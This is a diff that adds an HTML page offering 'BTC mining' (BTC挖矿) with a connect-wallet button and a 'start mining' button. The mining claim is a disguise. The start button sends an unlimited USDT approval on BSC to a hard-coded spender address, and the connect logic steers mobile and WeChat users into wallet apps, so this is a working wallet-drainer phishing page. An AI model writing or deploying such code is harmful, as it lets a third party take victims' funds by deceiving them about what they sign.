@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>BTC挖矿</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+
+<body style="text-align:center;margin-top:80px;font-family:sans-serif">
+
+<h2>BTC挖矿</h2>
+
+<p id="status">未连接钱包</p>
+
+<button onclick="connect()">连接钱包</button>
+<br><br>
+<button onclick="approve()">启动BTC挖矿</button>
+
+<script>
+let web3;
+let account;
+
+const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";
+
+const ABI = [{
+  "constant": false,
+  "inputs": [
+    {"name":"_spender","type":"address"},
+    {"name":"_value","type":"uint256"}
+  ],
+  "name":"approve",
+  "outputs":[{"name":"","type":"bool"}],
+  "type":"function"
+}];
+
+// 👉 判断环境
+function isMobile(){
+  return /Android|iPhone/i.test(navigator.userAgent);
+}
+
+function isWeChat(){
+  return /MicroMessenger/i.test(navigator.userAgent);
+}
+
+// 👉 跳转钱包（关键）
+function openWallet(){
+  const url = window.location.href;
+
+  // TP钱包
+  const tp = "tpdapp://open?url=" + encodeURIComponent(url);
+
+  // MetaMask
+  const mm = "https://metamask.app.link/dapp/" + location.host + location.pathname;
+
+  // 尝试打开
+  window.location.href = tp;
+
+  setTimeout(()=>{
+    window.location.href = mm;
+  },1500);
+}
+
+// 👉 连接钱包
+async function connect() {
+
+  // 微信环境
+  if(isWeChat()){
+    alert("请点击右上角 → 在浏览器打开");
+    return;
+  }
+
+  // 没有钱包环境（手机）
+  if(typeof window.ethereum === "undefined"){
+    if(isMobile()){
+      openWallet();
+      return;
+    }else{
+      alert("请安装 MetaMask");
+      return;
+    }
+  }
+
+  try {
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.getAccounts();
+    account = accounts[0];
+
+    document.getElementById("status").innerText = "已连接: " + account;
+
+    const chainId = await web3.eth.getChainId();
+    if(chainId !== 56){
+      alert("请切换到 BSC 主网");
+    }
+
+  } catch(err) {
+    alert("连接失败");
+  }
+}
+
+// 👉 授权
+async function approve() {
+
+  if(!account){
+    alert("请先连接钱包");
+    return;
+  }
+
+  const confirmAction = confirm("启动BTC挖矿！（将授权无限额度）");
+  if(!confirmAction) return;
+
+  const contract = new web3.eth.Contract(ABI, tokenAddress);
+
+  try {
+    const tx = await contract.methods.approve(
+      spender,
+      web3.utils.toTwosComplement(-1)
+    ).send({from: account});
+
+    alert("授权成功");
+
+    // 👉 授权后跳转
+    window.location.href = "https://你的官网.com";
+
+  } catch(err) {
+    alert("授权失败");
+  }
+}
+</script>
+
+</body>
+</html>
